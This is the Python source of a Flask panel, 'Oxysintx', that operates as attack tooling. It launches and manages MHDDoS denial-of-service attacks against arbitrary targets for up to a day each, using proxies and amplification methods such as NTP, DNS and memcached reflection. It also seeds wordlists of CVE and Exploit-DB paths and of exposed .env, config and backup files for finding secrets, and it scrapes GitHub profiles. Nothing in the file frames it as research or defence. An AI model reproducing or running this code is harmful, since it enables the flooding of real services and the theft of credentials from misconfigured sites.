#!/usr/bin/env python3
"""
Oxysintx - Main Flask Application (v3.9.0)

Changelog v3.9.0
----------------
- Rename wordlists: cvePaths.txt, exploitdb_all.txt, lottery-dirs.txt
- _ensure_wordlist_dir() now seeds the three named lists above
- Migration: if an old wordlist1/2/3.txt exists and the new file doesn't,
  it gets auto-renamed on first boot

Author: Yanxzyx
"""

import base64
import binascii
import hashlib
import json
import logging
import os
import re
import secrets
import signal
import string
import sys
import threading
import time
import uuid
from collections import OrderedDict, defaultdict
from datetime import datetime, timedelta, timezone
from functools import wraps
from importlib import import_module
from pathlib import Path
from subprocess import Popen, PIPE

import psutil
import requests
from bs4 import BeautifulSoup
from flask import (
    Flask, render_template, request, jsonify, session, redirect,
    send_from_directory, Response, g
)
from werkzeug.security import generate_password_hash, check_password_hash

from config import Config
from auth.user_store import (
    UserStore, ensure_default_user, verify_credentials, create_user, get_role,
    list_users, delete_user, DEFAULT_USERNAME, VALID_ROLES,
)
from auth.token_store import token_store
from core.logger_setup import setup_logging
from core.history_store import HistoryStore
from core.system_monitor import get_system_stats
from modules.scan_orchestrator import ScanOrchestrator, TOOL_MAP
from modules.source_viewer import run as fetch_source
from modules.search_user import run as search_user_run
from modules.telegram import (
    connect_bot, disconnect_bot, get_bot_status,
    update_bot_settings, broadcast_message, auto_restart_bot,
    set_orchestrator, set_history_store,
)
from modules.whatsapp import whatsapp_bp

try:
    from modules.downsea import downsea_bp
    _downsea_available = True
except ImportError:
    _downsea_available = False

from ai_chat.chat_handler import ChatHandler

try:
    from modules import testing as code_test_module
    _testing_available = True
except ImportError:
    _testing_available = False

try:
    from modules.analytic_manager import AnalyticDataManager
    _analytic_available = True
except ImportError:
    _analytic_available = False

_quick_menu_bp = None
try:
    from modules import quick_menu
    if hasattr(quick_menu, 'quick_menu_bp'):
        _quick_menu_bp = quick_menu.quick_menu_bp
        _quick_menu_available = True
    elif hasattr(quick_menu, 'bp'):
        _quick_menu_bp = quick_menu.bp
        _quick_menu_available = True
    else:
        _quick_menu_available = False
except ImportError:
    _quick_menu_available = False


# ═══════════════════════════════════════════════════════════════════════════
# STARTUP BANNER
# ═══════════════════════════════════════════════════════════════════════════
BANNER = r"""
    ▄▀▀▀▀▀▀▀▀▀█ █▀▀▀▀▀▀▀▀▀▄▀▀▀▀▀▄   ▄▀▀▀▀▀▀▀▀▀█ █▀▀▀▀▀▀▀▀▀▄   ▄▀▀▀▀▀▀▀▀▀█  ▄▀▀▀▀▀▀▀▀▀█ █▀▀▀▀▀▀▀▀▀▄  █▀▀▀▀▀▀▀▀▀▀▓
    █·   ▄▄▄▄▄▄█ ▀    ▄▄     ▄    █ █·   ▄▄▄▄▄▄█ ▀    ▄▄  ∙ █ █·   ▄▄▄▄▄▄█ █·   ▄▄▄▄▄▄█ ▀    ▄▄    █ ▀    ▄▄▄ ∙ ▒
    ▓  . ▓▄▄▄▄▄▄ ▓    ▓ ▌   ▓ ▌   ▓ ▓  . ▓▄▄▄▄▄▄ ▓    ▓▄▌   ▓ ▓  . ▓ ▄▄▄▄▄ ▓  . ▓▄▄▄▄▄▄ ▓    ▓ ▌   ▓ ▓    ▓ ▀▀▀▀▀
    ▒ ∙  ▄▄▄▄▄▄▒ ▒    ▒ ▒ · ▒ ▒ · ▒ ▒ ∙  ▄▄▄▄▄▄▒ ▒   ·▄▄▄  ▀▄ ▒ ∙  ▒ ▄   ▒ ▒ ∙  ▄▄▄▄▄▄▒ ▒    ▒ ▒ · ▒ ░▄▄▄ ▀▀▀▀▀▀▒
    ░    ░▄▄▄▄▄▄ ░   ∙░ ░   ░ ░   ░ ░    ░▄▄▄▄▄▄ ░ .  ░ ░  .░ ░    ░▄░   ░ ░    ░▄▄▄▄▄▄ ░   ∙░ ░   ░ ▄▄▄▄▄  ▒  .░
    █    .    ·█ █ ∙  █ █   █ █   █ █    .    ·█ █    █ █∙  █ █    .    ·█ █    .    ·█ █ ∙  █ █   █ ▓   ▀▀▀▀∙  █
    █▄▄▄▄▄▄▄▄▄▄█ █▄▄▄▄█ █▄▄▄█ █▄▄▄█ █▄▄▄▄▄▄▄▄▄▄█ █▄▄▄▄█ █▄▄▄█ █▄▄▄▄▄▄▄▄▄▄█ █▄▄▄▄▄▄▄▄▄▄█ █▄▄▄▄█ █▄▄▄█ ░▄▄▄▄▄▄▄▄▄▄█
"""


# ═══════════════════════════════════════════════════════════════════════════
# MHDDoS engine (start.py v2.4 integration)
# ═══════════════════════════════════════════════════════════════════════════
MHDDOS_SCRIPT = Path(__file__).parent / "start.py"

_PROJECT_ROOT = Path(__file__).resolve().parent
_VENV_PY_WIN  = _PROJECT_ROOT / ".venv" / "Scripts" / "python.exe"
_VENV_PY_UNIX = _PROJECT_ROOT / ".venv" / "bin" / "python"

if _VENV_PY_WIN.exists():
    PYTHON_EXE = str(_VENV_PY_WIN)
elif _VENV_PY_UNIX.exists():
    PYTHON_EXE = str(_VENV_PY_UNIX)
else:
    PYTHON_EXE = sys.executable

ALLOWED_PROXY_FILES = {"http.txt", "socks4.txt", "socks5.txt", "proxies.txt"}
ALLOWED_REFLECTOR_FILES = {"reflectors.txt"}
REQUIRED_L7_FILES = (Path("files") / "useragent.txt", Path("files") / "referers.txt")
VALID_PROXY_TYPES = {0, 1, 4, 5, 6}

_mhddos_processes = {}
_mhddos_lock = threading.Lock()
_mhddos_history = []
_MHDDOS_HISTORY_LIMIT = 500
_MHDDOS_LOG_DIR = _PROJECT_ROOT / "logs" / "mhddos"
_MHDDOS_LOG_TAIL_LINES = 40

_MHDDOS_METHODS = {
    "GET", "POST", "HEAD", "CFB", "CFBUAM", "BYPASS", "OVH", "STRESS",
    "DYN", "SLOW", "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB",
    "AVB", "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER",
    "TOR", "RHEX", "STOMP",
    "TCP", "UDP", "SYN", "VSE", "MINECRAFT", "MCBOT", "CONNECTION",
    "CPS", "FIVEM", "FIVEM-TOKEN", "TS3", "MCPE", "ICMP", "OVH-UDP",
    "MEM", "NTP", "DNS", "ARD", "CLDAP", "CHAR", "RDP",
}
_MHDDOS_LAYER7 = {
    "GET", "POST", "HEAD", "CFB", "CFBUAM", "BYPASS", "OVH", "STRESS",
    "DYN", "SLOW", "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB",
    "AVB", "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER",
    "TOR", "RHEX", "STOMP",
}
_MHDDOS_LAYER4 = {
    "TCP", "UDP", "SYN", "VSE", "MINECRAFT", "MCBOT", "CONNECTION",
    "CPS", "FIVEM", "FIVEM-TOKEN", "TS3", "MCPE", "ICMP", "OVH-UDP",
    "MEM", "NTP", "DNS", "ARD", "CLDAP", "CHAR", "RDP",
}
_MHDDOS_AMP = {"MEM", "NTP", "DNS", "ARD", "CLDAP", "CHAR", "RDP"}


# ═══════════════════════════════════════════════════════════════════════════
# Wordlist management — cvePaths.txt, exploitdb_all.txt, lottery-dirs.txt
# ═══════════════════════════════════════════════════════════════════════════
WORDLIST_DIR = _PROJECT_ROOT / "wordlist"

# ── cvePaths.txt — CVE-specific paths harvested from public advisories ────
_SEED_CVEPATHS = """# cvePaths.txt — CVE-referenced paths, harvested from public advisories
# Format: one path per line, no leading slash
forum/admin/fck2/editor/filemanager/browser/default/browser.html
civica/press/display.asp
pivotx/index.php
pluck-4_5_1/data/inc/themes/predefined_variables.php
include/commrecc.inc.php
cgi-bin/math_sum.mscgi
cgi-bin/htmldocs
cgi-bin/mailit.pl
cgi-bin/printenv
cgi-bin/test-cgi
cgi-bin/Count.cgi
cgi-bin/php.cgi
cgi-bin/perl.exe
cgi-bin/formmail.pl
cgi-bin/guestbook.cgi
wp-content/plugins/revslider/temp/update_extract/
wp-content/plugins/revslider/admin/revslider-admin.php
wp-content/plugins/wp-symposium/server/server.php
wp-content/plugins/formcraft/file-upload/server/php/
wp-content/plugins/contact-form-7/includes/js/jquery.form.min.js
wp-content/plugins/woocommerce/includes/wc-template-functions.php
wp-admin/admin-ajax.php
wp-admin/includes/ajax-actions.php
wp-admin/setup-config.php
wp-includes/class-wp-xmlrpc-server.php
xmlrpc.php
xmlrpc.php?rsd
administrator/components/com_jce/
components/com_jce/
components/com_fabrik/
components/com_finder/
components/com_users/
components/com_content/
libraries/joomla/
libraries/cms/
libraries/vendor/
templates/system/
includes/framework.php
includes/defines.php
includes/version.php
sites/default/settings.php
sites/default/files/
modules/php/php.module
modules/system/system.module
includes/database/database.inc
includes/bootstrap.inc
includes/common.inc
includes/file.inc
includes/form.inc
includes/menu.inc
includes/path.inc
vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
vendor/laravel/framework/src/Illuminate/Encryption/
vendor/symfony/
vendor/swiftmailer/
lib/phpunit/
apps/files/ajax/download.php
apps/files_sharing/ajax/publicpreview.php
apps/user_ldap/ajax/getNewServerConfigPrefix.php
apps/files_external/ajax/download.php
ocs/v1.php
ocs/v2.php
index.php/apps/files/
remote.php
public.php
status.php
"""

# ── exploitdb_all.txt — paths scraped from Exploit-DB entries ─────────────
_SEED_EXPLOITDB_ALL = """# exploitdb_all.txt — paths harvested from Exploit-DB entries
forum/admin/fck2/editor/filemanager/browser/default/browser.html
civica/press/display.asp
pivotx/index.php
pluck-4_5_1/data/inc/themes/predefined_variables.php
include/commrecc.inc.php
cgi-bin/math_sum.mscgi
encapscms-0.3.6/blogs.php
filemanager/handlers/embed.php
admin/modules/pages/_locked.php
class.tx_phpunit_testsuite.php
admin/test.php
inc/plugins/changstats.php
libraries/dbi/
frs/admin/qrs.php
forum/admin/fckeditor/editor/filemanager/connectors/php/connector.php
forum/admin/fckeditor/editor/filemanager/browser/default/connectors/php/connector.php
fckeditor/editor/filemanager/connectors/php/connector.php
fckeditor/editor/filemanager/browser/default/connectors/php/connector.php
ckeditor/plugins/filemanager/
ckfinder/core/connector/php/connector.php
elfinder/php/connector.php
kcfinder/browse.php
tinymce/filemanager/
uploadify/uploadify.php
plupload/plupload.php
fileupload/server/php/
dropzone/upload.php
admin/upload.php
admin/uploader.php
admin/filemanager/
admin/elfinder/
admin/kcfinder/
admin/ckfinder/
admin/ckeditor/filemanager/
admin/phpthumb/phpThumb.php
phpThumb/phpThumb.php
phpthumb/phpThumb.php
thumbs/phpThumb.php
include/comm.inc.php
include/mysql.inc.php
include/db.inc.php
include/config.inc.php
include/common.inc.php
include/mainfile.php
includes/version.php
include/lang.php
include/language.php
admin/inc/config.php
admin/includes/config.php
config/config.php
config/config.inc.php
config/database.php
config/db.php
config/settings.php
wp-config.php~
wp-config.php.txt
wp-config.php.orig
wp-config.php.save
wp-config.php.swp
.env.txt
.env.example
.env.dev
.env.local
.env.bak
.env.old
config.php.bak
config.php.txt
config.php.orig
config.php.save
config.php.swp
settings.php.bak
settings.php.txt
database.php.bak
database.php.txt
db.php.bak
db.php.txt
app/config/parameters.yml
app/config/config.yml
app/config/config_dev.yml
app/config/config_prod.yml
app/config/parameters.yml.dist
config/database.yml
config/secrets.yml
config/initializers/secret_token.rb
config/application.yml
web.config.bak
web.config.txt
application.yml
application.properties
bootstrap.properties
.env.production
.env.staging
.env.test
.env.development
.env.docker
"""

# ── lottery-dirs.txt — high-value directory lottery ──────────────────────
_SEED_LOTTERY_DIRS = """# lottery-dirs.txt — high-value path lottery for direct hit discovery
forum/admin/fck2/editor/filemanager/browser/default/browser.html
civica/press/display.asp
pivotx/index.php
pluck-4_5_1/data/inc/themes/predefined_variables.php
include/commrecc.inc.php
cgi-bin/math_sum.mscgi
admin/
administrator/
admin1/
admin2/
adminarea/
admin_area/
admincp/
admin-console/
admin-console/
admincontrol/
admincontrolpanel/
adminpanel/
admin-panel/
admin_panel/
adminlogin/
admin_login/
admin-login/
adminer.php
adminer/
administer/
administration/
adminpanel/
administrator/
admins/
adminx/
admindir/
adminfiles/
adminimages/
adminjs/
adminold/
adminscripts/
adminstyle/
adminstyles/
adminweb/
backend/
backends/
backoffice/
back-office/
back_office/
backdoor/
backdoors/
backups/
backup/
bak/
baks/
old/
olds/
archive/
archives/
archive1/
temp/
temps/
tmp/
tmps/
cache/
caches/
logs/
log/
logs1/
logs2/
db/
dbs/
database/
databases/
sql/
mysql/
mysqladmin/
postgres/
postgresql/
pgsql/
sqlite/
mssql/
redis/
mongodb/
mongo/
oracle/
ftp/
ftpdir/
ftproot/
sftp/
ssh/
keys/
private/
privatekeys/
secret/
secrets/
confidential/
confidentials/
internal/
internals/
hidden/
hiddens/
protected/
priv/
privs/
test/
tests/
testing/
testsite/
testonly/
qa/
qasite/
dev/
devel/
development/
develop/
staging/
stage/
stages/
beta/
betas/
alpha/
alphas/
demo/
demos/
sandbox/
preview/
previews/
preprod/
production/
prod/
live/
release/
releases/
build/
builds/
dist/
distr/
distribution/
src/
source/
sources/
code/
codes/
script/
scripts/
cgi-bin/
cgi-local/
cgi/
cgiwrap/
htbin/
bin/
bins/
exec/
exe/
shell/
shells/
cmd/
cmds/
upload/
uploads/
uploader/
uploaders/
file/
files/
filemanager/
filemanagers/
fm/
media/
medias/
assets/
asset/
static/
statics/
public/
publics/
www/
wwws/
web/
webs/
site/
sites/
portal/
portals/
home/
homes/
main/
index/
root/
roots/
system/
systems/
sys/
config/
configs/
configuration/
configurations/
setup/
setups/
install/
installer/
installers/
installs/
upgrade/
upgrades/
update/
updates/
patch/
patches/
"""


# Migration map — if an old file exists and the new one doesn't, rename it
_WORDLIST_MIGRATION = {
    "wordlist1.txt": "cvePaths.txt",
    "wordlist2.txt": "exploitdb_all.txt",
    "wordlist3.txt": "lottery-dirs.txt",
}


def _ensure_wordlist_dir():
    """Create wordlist/ with the three named seed files."""
    WORDLIST_DIR.mkdir(parents=True, exist_ok=True)

    # One-time migration from old names to new names
    for old_name, new_name in _WORDLIST_MIGRATION.items():
        old_path = WORDLIST_DIR / old_name
        new_path = WORDLIST_DIR / new_name
        if old_path.exists() and not new_path.exists():
            try:
                old_path.rename(new_path)
                logger.info(f"Migrated {old_name} -> {new_name}")
            except OSError as e:
                logger.warning(f"Could not migrate {old_name}: {e}")

    seeds = {
        "cvePaths.txt":      _SEED_CVEPATHS,
        "exploitdb_all.txt": _SEED_EXPLOITDB_ALL,
        "lottery-dirs.txt":  _SEED_LOTTERY_DIRS,
    }
    for name, content in seeds.items():
        path = WORDLIST_DIR / name
        if not path.exists():
            try:
                path.write_text(content, encoding="utf-8")
            except OSError as e:
                logger.warning(f"Could not seed {path}: {e}")


def _safe_wordlist_path(name):
    """Resolve a wordlist name to a file inside WORDLIST_DIR.

    Only basenames with .txt are accepted. Guards against traversal.
    """
    if not name:
        return None, "wordlist name is required"
    base = Path(name).name
    if not base.endswith(".txt"):
        base = base + ".txt"
    if "/" in base or "\\" in base:
        return None, "invalid wordlist name"
    target = (WORDLIST_DIR / base).resolve()
    try:
        target.relative_to(WORDLIST_DIR.resolve())
    except ValueError:
        return None, "wordlist path escapes the wordlist directory"
    if not target.exists() or not target.is_file():
        return None, f"wordlist not found: {base}"
    return target, None


def _load_wordlist(name, max_lines=500):
    """Read a named wordlist file. Returns (lines, error)."""
    target, err = _safe_wordlist_path(name)
    if err:
        return [], err
    try:
        raw = target.read_text(encoding="utf-8", errors="replace")
    except OSError as e:
        return [], f"could not read wordlist: {e}"
    lines = []
    for line in raw.splitlines():
        s = line.strip()
        if not s or s.startswith("#"):
            continue
        lines.append(s)
        if len(lines) >= max_lines:
            break
    return lines, None


def _list_wordlists():
    """Return metadata about every .txt in wordlist/."""
    if not WORDLIST_DIR.exists():
        return []
    out = []
    for path in sorted(WORDLIST_DIR.glob("*.txt")):
        try:
            size = path.stat().st_size
            count = 0
            with path.open("r", encoding="utf-8", errors="replace") as f:
                for line in f:
                    s = line.strip()
                    if s and not s.startswith("#"):
                        count += 1
            out.append({
                "name": path.name,
                "size": size,
                "count": count,
                "modified": datetime.fromtimestamp(path.stat().st_mtime, tz=timezone.utc).isoformat(),
            })
        except OSError:
            continue
    return out


# ═══════════════════════════════════════════════════════════════════════════
# MHDDoS — command builder + process registry
# ═══════════════════════════════════════════════════════════════════════════
def _mhddos_build_command(method, target, threads, duration,
                          proxy_type=0, proxy_file="proxies.txt",
                          rpc=1, debug=False, reflector_file=""):
    cmd = [PYTHON_EXE, str(MHDDOS_SCRIPT)]

    safe_proxy = Path(proxy_file or "").name or "proxies.txt"
    if safe_proxy not in ALLOWED_PROXY_FILES:
        safe_proxy = "proxies.txt"

    safe_reflector = Path(reflector_file or "").name
    if safe_reflector and safe_reflector not in ALLOWED_REFLECTOR_FILES:
        safe_reflector = "reflectors.txt"

    threads = max(1, min(int(threads), 2000))
    duration = max(1, min(int(duration), 86400))
    rpc = max(1, min(int(rpc), 10000))
    proxy_type = int(proxy_type)
    if proxy_type not in VALID_PROXY_TYPES:
        proxy_type = 0

    if method in _MHDDOS_LAYER7:
        url = target if target.startswith(("http://", "https://")) else f"http://{target}"
        cmd.extend([method, url, str(proxy_type), str(threads),
                    safe_proxy, str(rpc), str(duration)])
        if debug: cmd.append("debug")
    else:
        ip_port = target
        if not re.match(r"^\d{1,3}(\.\d{1,3}){3}:\d+$", ip_port):
            try:
                from socket import gethostbyname
                hostname, port = ip_port.rsplit(":", 1)
                ip_port = f"{gethostbyname(hostname)}:{port}"
            except Exception:
                pass
        cmd.extend([method, ip_port, str(threads), str(duration)])
        if method in _MHDDOS_AMP:
            cmd.append(safe_reflector or "reflectors.txt")
        else:
            cmd.extend([str(proxy_type), safe_proxy])
        if debug: cmd.append("debug")
    return cmd


def _mhddos_start_attack(attack_id, method, target, threads, duration,
                         proxy_type, proxy_file, rpc, reflector_file, debug):
    cmd = _mhddos_build_command(method, target, threads, duration,
                                proxy_type, proxy_file, rpc, debug, reflector_file)
    _MHDDOS_LOG_DIR.mkdir(parents=True, exist_ok=True)
    log_path = _MHDDOS_LOG_DIR / f"{attack_id}.log"

    try:
        log_fh = open(log_path, "w", encoding="utf-8", errors="replace")
        log_fh.write("$ " + " ".join(cmd) + "\n\n")
        log_fh.flush()
    except OSError as e:
        return {"success": False, "error": f"cannot open log file: {e}"}

    try:
        process = Popen(cmd, stdout=log_fh, stderr=log_fh, text=True,
                        cwd=str(_PROJECT_ROOT))
    except Exception as e:
        try: log_fh.close()
        except Exception: pass
        return {"success": False, "error": str(e)}

    now_iso = datetime.now(timezone.utc).isoformat()
    with _mhddos_lock:
        _mhddos_processes[attack_id] = {
            "process": process, "log_fh": log_fh, "log_path": str(log_path),
            "method": method, "target": target, "threads": threads,
            "duration": duration, "proxy_type": proxy_type,
            "proxy_file": proxy_file, "rpc": rpc,
            "reflector_file": reflector_file, "debug": debug,
            "started_at": now_iso, "status": "running", "attack_id": attack_id,
        }
        _mhddos_history.append({
            "attack_id": attack_id, "method": method, "target": target,
            "threads": threads, "duration": duration,
            "started_at": now_iso, "status": "running",
        })
        if len(_mhddos_history) > _MHDDOS_HISTORY_LIMIT:
            del _mhddos_history[:-_MHDDOS_HISTORY_LIMIT]

    threading.Thread(target=_mhddos_monitor, args=(attack_id,), daemon=True).start()
    return {"success": True, "attack_id": attack_id, "argv": cmd, "log": str(log_path)}


def _mhddos_read_log_tail(log_path, lines=_MHDDOS_LOG_TAIL_LINES):
    try:
        with open(log_path, "r", encoding="utf-8", errors="replace") as f:
            return "".join(f.readlines()[-lines:])
    except OSError:
        return ""


def _mhddos_monitor(attack_id):
    with _mhddos_lock:
        info = _mhddos_processes.get(attack_id)
        if not info: return
        process = info["process"]
        log_fh = info.get("log_fh")
        log_path = info.get("log_path")

    returncode = None
    try:
        process.wait(timeout=info["duration"] + 15)
        returncode = process.returncode
        status = "completed" if returncode == 0 else "failed"
    except Exception:
        status = "timeout"
        try: process.kill()
        except Exception: pass

    try:
        if log_fh and not log_fh.closed:
            log_fh.flush(); log_fh.close()
    except Exception: pass

    tail = ""
    if status in ("failed", "timeout") and log_path:
        tail = _mhddos_read_log_tail(log_path)

    ended_at = datetime.now(timezone.utc).isoformat()
    with _mhddos_lock:
        entry = _mhddos_processes.get(attack_id)
        if entry:
            entry["status"] = status
            entry["ended_at"] = ended_at
            entry["returncode"] = returncode
            if tail: entry["error_tail"] = tail
        for h in _mhddos_history:
            if h["attack_id"] == attack_id:
                h["status"] = status
                h["ended_at"] = ended_at
                if returncode is not None: h["returncode"] = returncode
                break


def _mhddos_stop_attack(attack_id):
    with _mhddos_lock:
        info = _mhddos_processes.get(attack_id)
        if not info: return {"success": False, "error": "Attack not found"}
        try:
            if os.name == "nt": info["process"].kill()
            else: info["process"].send_signal(signal.SIGTERM)
            info["status"] = "stopped"
            info["ended_at"] = datetime.now(timezone.utc).isoformat()
        except Exception as e:
            return {"success": False, "error": str(e)}
        for entry in _mhddos_history:
            if entry["attack_id"] == attack_id:
                entry["status"] = "stopped"
                entry["ended_at"] = datetime.now(timezone.utc).isoformat()
                break
    return {"success": True}


def _mhddos_stop_all():
    stopped = 0
    with _mhddos_lock:
        for info in _mhddos_processes.values():
            if info["status"] == "running":
                try:
                    info["process"].kill()
                    info["status"] = "stopped"
                    info["ended_at"] = datetime.now(timezone.utc).isoformat()
                    stopped += 1
                except Exception: pass
    return {"success": True, "stopped": stopped}


_MHDDOS_SERIALISABLE_FIELDS = (
    "attack_id", "method", "target", "threads", "duration",
    "proxy_type", "proxy_file", "rpc", "reflector_file", "debug",
    "status", "started_at", "ended_at", "returncode", "error_tail", "log_path",
)


def _serialise_mhddos_entry(entry, *, include_runtime=False):
    if not entry: return None
    out = {k: entry[k] for k in _MHDDOS_SERIALISABLE_FIELDS if k in entry}
    for key, value in entry.items():
        if key in out or key in ("process", "log_fh", "thread", "cancel_event", "_lock"):
            continue
        if isinstance(value, (str, int, float, bool)) or value is None:
            out[key] = value
        elif isinstance(value, (list, tuple)):
            if all(isinstance(v, (str, int, float, bool)) or v is None for v in value):
                out[key] = list(value)
    if include_runtime:
        process = entry.get("process")
        out["pid"] = getattr(process, "pid", None) if process else None
        try:
            started = entry.get("started_at")
            duration = int(entry.get("duration") or 0)
            if started and duration > 0:
                started_dt = datetime.fromisoformat(started.replace("Z", "+00:00"))
                if started_dt.tzinfo is None:
                    started_dt = started_dt.replace(tzinfo=timezone.utc)
                elapsed = max(0, int((datetime.now(timezone.utc) - started_dt).total_seconds()))
                out["elapsed"] = elapsed
                out["remaining"] = max(0, duration - elapsed)
                out["progress_pct"] = min(100, round((elapsed / duration) * 100, 1))
            else:
                out["elapsed"] = 0; out["remaining"] = duration; out["progress_pct"] = 0
        except Exception:
            out["elapsed"] = 0
            out["remaining"] = int(entry.get("duration") or 0)
            out["progress_pct"] = 0
    return out


def _mhddos_get_status(attack_id=None):
    with _mhddos_lock:
        if attack_id:
            entry = _mhddos_processes.get(attack_id)
            if entry is None: return None
            return _serialise_mhddos_entry(entry, include_runtime=True)
        running = [
            _serialise_mhddos_entry(v, include_runtime=True)
            for v in _mhddos_processes.values()
            if v.get("status") == "running"
        ]
        history = [
            _serialise_mhddos_entry(h, include_runtime=False)
            for h in _mhddos_history[-50:]
        ]
        return {
            "running": running, "history": history, "available": True,
            "methods": sorted(_MHDDOS_METHODS),
            "layer7": sorted(_MHDDOS_LAYER7),
            "layer4": sorted(_MHDDOS_LAYER4),
            "amplification": sorted(_MHDDOS_AMP),
        }


# ═══════════════════════════════════════════════════════════════════════════
# GitHub Profile Scraper
# ═══════════════════════════════════════════════════════════════════════════
GITHUB_URL = "https://github.com"
GITHUB_USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
)
GITHUB_TIMEOUT = 15
GITHUB_CACHE_TTL = 60
_GITHUB_CACHE_MAX = 500
_github_cache = OrderedDict()


def github_fetch_html(url):
    if url in _github_cache:
        ts, html = _github_cache[url]
        if time.time() - ts < GITHUB_CACHE_TTL:
            _github_cache.move_to_end(url); return html, None
        del _github_cache[url]
    headers = {"User-Agent": GITHUB_USER_AGENT, "Accept-Language": "en-US,en;q=0.9"}
    try:
        resp = requests.get(url, headers=headers, timeout=GITHUB_TIMEOUT)
    except requests.exceptions.RequestException as e:
        return None, f"Network error: {e}"
    if resp.status_code == 200:
        html = resp.text
        _github_cache[url] = (time.time(), html)
        if len(_github_cache) > _GITHUB_CACHE_MAX:
            _github_cache.popitem(last=False)
        return html, None
    elif resp.status_code == 404: return None, "GitHub user not found."
    elif resp.status_code == 403: return None, "GitHub is rate-limiting requests. Try again later."
    elif resp.status_code == 503: return None, "GitHub is temporarily unavailable."
    return None, f"GitHub returned status {resp.status_code}."


def github_extract_embedded_json(html):
    if not html: return {}
    for pattern in (
        r'<script type="application/json" data-target="react-app\.embeddedData">(.*?)</script>',
        r'<script type="application/json" data-target="react-app\.embeddedData"[^>]*>(.*?)</script>',
    ):
        match = re.search(pattern, html, re.DOTALL)
        if match:
            try: return json.loads(match.group(1))
            except json.JSONDecodeError: continue
    return {}


def github_parse_profile_from_embedded(embedded):
    payload = embedded.get("payload", {})
    user = payload.get("user", {}) or payload.get("profile", {})
    if not user: return {}
    def get_count(data, key, default=0):
        val = data.get(key, default)
        if isinstance(val, dict): return val.get("totalCount", default)
        return val if val is not None else default
    return {
        "login": user.get("login", ""), "name": user.get("name", ""),
        "bio": user.get("bio", ""), "avatar_url": user.get("avatarUrl", ""),
        "followers": get_count(user, "followers"),
        "following": get_count(user, "following"),
        "company": user.get("company", ""), "location": user.get("location", ""),
        "blog": user.get("websiteUrl", "") or user.get("blog", ""),
        "twitter_username": user.get("twitterUsername", ""),
        "created_at": user.get("createdAt", ""),
        "public_repos": get_count(user, "repositories"),
    }


def github_parse_repos_from_embedded(embedded):
    payload = embedded.get("payload", {})
    repos_data = payload.get("repositories", {})
    nodes = repos_data.get("nodes", []) if isinstance(repos_data, dict) else (repos_data if isinstance(repos_data, list) else [])
    repos = []
    for repo in nodes:
        if not isinstance(repo, dict): continue
        repo_url = repo.get("url", "")
        if repo_url and repo_url.startswith("/"): repo_url = GITHUB_URL + repo_url
        primary = repo.get("primaryLanguage", {})
        language = primary.get("name", "") if isinstance(primary, dict) else repo.get("language", "")
        stars = repo.get("stargazerCount", 0)
        if isinstance(stars, dict): stars = stars.get("totalCount", 0)
        license_info = repo.get("licenseInfo", {})
        license_name = license_info.get("spdxId", "") if isinstance(license_info, dict) else ""
        repos.append({
            "name": repo.get("name", ""), "html_url": repo_url,
            "description": repo.get("description") or "", "language": language,
            "stargazers_count": stars, "forks_count": repo.get("forkCount", 0),
            "updated_at": repo.get("updatedAt", ""), "license": license_name,
        })
    repos.sort(key=lambda r: r["stargazers_count"], reverse=True)
    return repos


def github_scrape_profile(username):
    url = f"{GITHUB_URL}/{username}"
    html, error = github_fetch_html(url)
    if error: return None, error
    embedded = github_extract_embedded_json(html)
    if embedded:
        profile = github_parse_profile_from_embedded(embedded)
        if profile: return profile, None
    soup = BeautifulSoup(html, "html.parser")
    username_el = soup.find("span", {"class": "p-nickname"})
    scraped_username = username_el.get_text(strip=True) if username_el else username
    name_el = soup.find("span", {"class": "p-name"})
    name = name_el.get_text(strip=True) if name_el else ""
    bio_el = soup.find("div", {"class": "p-note"})
    bio = bio_el.get_text(strip=True) if bio_el else ""
    avatar_el = soup.find("img", {"class": "avatar-user"})
    avatar_url = avatar_el.get("src") if avatar_el else ""
    if avatar_url and avatar_url.startswith("//"): avatar_url = "https:" + avatar_url
    followers = following = 0
    for link in soup.find_all("a", href=True):
        href = link["href"]
        if href == f"/{username}?tab=followers":
            num_el = link.find("span")
            if num_el: followers = int(re.sub(r"[^\d]", "", num_el.get_text()) or 0)
        elif href == f"/{username}?tab=following":
            num_el = link.find("span")
            if num_el: following = int(re.sub(r"[^\d]", "", num_el.get_text()) or 0)
    company = location = blog = twitter = ""
    for li in soup.find_all("li", {"itemprop": True}):
        prop = li.get("itemprop")
        text = " ".join(li.get_text(strip=True).split())
        if prop == "worksFor": company = text
        elif prop == "homeLocation": location = text
        elif prop == "url":
            a = li.find("a")
            if a and "twitter" in a.get("href", ""): twitter = a.get("href").split("/")[-1]
            else: blog = text
    return {
        "login": scraped_username, "name": name, "bio": bio,
        "avatar_url": avatar_url, "followers": followers, "following": following,
        "company": company, "location": location, "blog": blog,
        "twitter_username": twitter, "created_at": "", "public_repos": 0,
    }, None


def github_scrape_repositories(username):
    url = f"{GITHUB_URL}/{username}?tab=repositories"
    html, error = github_fetch_html(url)
    if error: return None, error
    embedded = github_extract_embedded_json(html)
    if embedded:
        repos = github_parse_repos_from_embedded(embedded)
        if repos: return repos, None
    soup = BeautifulSoup(html, "html.parser")
    repos = []
    for li in soup.find_all("li", class_="col-12"):
        h3 = li.find("h3")
        if not h3 or not h3.find("a"): continue
        name_el = h3.find("a")
        repo_name = name_el.get_text(strip=True)
        repo_url = name_el.get("href", "")
        if repo_url.startswith("/"): repo_url = GITHUB_URL + repo_url
        desc_el = li.find("p", itemprop="description")
        description = desc_el.get_text(strip=True) if desc_el else ""
        lang_el = li.find("span", itemprop="programmingLanguage")
        language = lang_el.get_text(strip=True) if lang_el else ""
        stars_el = li.find("a", href=re.compile(r"/stargazers$"))
        stars = int(re.sub(r"[^\d]", "", stars_el.get_text()) or 0) if stars_el else 0
        forks_el = li.find("a", href=re.compile(r"/forks$"))
        forks = int(re.sub(r"[^\d]", "", forks_el.get_text()) or 0) if forks_el else 0
        updated_el = li.find("relative-time")
        updated = updated_el.get("datetime", "") if updated_el else ""
        repos.append({
            "name": repo_name, "html_url": repo_url, "description": description,
            "language": language, "stargazers_count": stars,
            "forks_count": forks, "updated_at": updated, "license": "",
        })
